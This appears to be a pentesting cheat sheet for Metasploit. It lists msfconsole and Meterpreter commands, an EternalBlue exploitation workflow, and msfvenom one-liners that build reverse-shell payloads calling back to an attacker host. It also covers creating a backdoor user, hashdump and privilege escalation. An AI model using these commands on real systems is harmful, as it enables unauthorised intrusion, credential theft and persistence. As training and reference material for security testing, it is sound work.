# 💥 Metasploit Cheat Sheet

**Metasploit** is the most widely used exploitation framework. This sheet covers the `msfconsole`, payload generation with `msfvenom`, and finding exploits with `searchsploit`.

```bash
# Launch the console
msfconsole
```

> 💡 Always set the **full payload name** (e.g. `windows/x64/meterpreter/reverse_tcp`), not a menu index number — indexes change between sessions.

---

## msfconsole — Core Commands

| Command | Example | Description |
| --- | --- | --- |
| `search` | `search ms17-010` | Find modules by keyword/CVE |
| `use` | `use exploit/windows/smb/ms17_010_eternalblue` | Select a module |
| `info` | `info` | Show details about the current module |
| `show options` | `show options` | List required/optional settings |
| `show payloads` | `show payloads` | List compatible payloads |
| `set` | `set RHOSTS 10.10.10.1` | Set an option |
| `setg` | `setg LHOST tun0` | Set an option globally (persists across modules) |
| `unset` | `unset RHOSTS` | Clear an option |
| `exploit` / `run` | `exploit` | Launch the module |
| `back` | `back` | Leave the current module |
| `sessions` | `sessions -i 1` | List / interact with sessions |

## Common Options to Set

| Option | Meaning |
| --- | --- |
| `RHOSTS` | Target IP(s) |
| `RPORT` | Target port |
| `LHOST` | Your IP (where the shell connects back) |
| `LPORT` | Your listening port |
| `PAYLOAD` | Payload to deliver (use the full name) |

## Meterpreter (post-exploitation)

| Command | Description |
| --- | --- |
| `sysinfo` | Target OS / architecture info |
| `getuid` | Current user context |
| `getsystem` | Attempt privilege escalation to SYSTEM |
| `hashdump` | Dump local password hashes |
| `shell` | Drop into a native system shell |
| `background` | Background the session (back to msf) |
| `upload localfile C:\\path` | Upload a file |
| `download C:\\file` | Download a file |
| `ps` | List processes |
| `migrate <pid>` | Move into another process |

---

## 🧰 msfvenom — Payload Generation

```bash
# General syntax
msfvenom -p [payload] LHOST=[ip] LPORT=[port] -f [format] -o [outfile]
```

| Target | Command |
| --- | --- |
| Windows EXE | `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.1 LPORT=4444 -f exe -o shell.exe` |
| Linux ELF | `msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.10.1 LPORT=4444 -f elf -o shell.elf` |
| PHP | `msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.10.1 LPORT=4444 -f raw -o shell.php` |
| ASP | `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.1 LPORT=4444 -f asp -o shell.asp` |
| Python | `msfvenom -p python/meterpreter/reverse_tcp LHOST=10.10.10.1 LPORT=4444 -f raw -o shell.py` |
| Windows EXE service | `msfvenom -p windows/exec CMD="net user hacker Pass123 /add" -f exe -o add.exe` |

| Flag | Description |
| --- | --- |
| `-p` | Payload |
| `-f` | Output format (`exe`, `elf`, `raw`, `asp`, `war`…) |
| `-o` | Output file |
| `-e` | Encoder (e.g. `x86/shikata_ga_nai`) |
| `--list payloads` | List all payloads |
| `--list formats` | List all output formats |

**Catch the payload** with the multi/handler:

```bash
msfconsole -q -x "use exploit/multi/handler; \
set PAYLOAD windows/x64/meterpreter/reverse_tcp; \
set LHOST tun0; set LPORT 4444; run"
```

---

## 🔎 searchsploit (Exploit-DB CLI)

| Command | Description |
| --- | --- |
| `searchsploit apache 2.4` | Search Exploit-DB |
| `searchsploit -t apache` | Search titles only |
| `searchsploit -m 12345` | Copy (mirror) an exploit to the current dir |
| `searchsploit -x 12345` | View an exploit's content |
| `searchsploit -w apache` | Show Exploit-DB URLs |
| `searchsploit -u` | Update the local database |

---

## 🧭 Typical workflow

```bash
# 1. Find and select an exploit
search ms17-010
use exploit/windows/smb/ms17_010_eternalblue

# 2. Configure
set RHOSTS 10.10.10.1
set LHOST tun0
set PAYLOAD windows/x64/meterpreter/reverse_tcp

# 3. Exploit, then enumerate
exploit
# (meterpreter) sysinfo / getuid / hashdump
```
